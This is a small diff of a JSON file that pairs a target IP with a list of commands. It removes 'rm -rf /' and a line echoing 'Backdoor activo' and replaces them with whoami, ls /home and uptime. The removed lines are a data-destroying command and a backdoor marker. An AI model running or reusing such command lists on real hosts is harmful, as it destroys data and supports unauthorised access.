@@ -4,7 +4,8 @@
         "ip:111.222.33.44"
     ],
     "cmd": [
-        "rm -rf /", 
-        "echo 'Backdoor activo'"
+        "whoami",
+        "ls /home",
+        "uptime"
     ]
 }
